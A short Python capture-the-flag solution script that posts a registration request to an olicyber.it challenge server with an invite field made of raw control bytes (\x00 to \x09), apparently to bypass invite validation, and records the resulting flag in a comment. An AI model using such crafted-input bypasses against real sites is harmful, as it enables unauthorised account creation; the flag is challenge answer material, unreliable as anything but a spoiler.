import requests

site = "http://frittomisto.challs.olicyber.it/api/register"
data = {
    "username" : "zamzamzamzam",
    "password" : "zamzamzamzam",
    "invite" : "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09",
}
r = requests.post(site, json = data).text
print(r)

#flag{b3nv3nut0_n3l_m10_f4nt4st1c0_s1t0_bu0n_l4v0r0}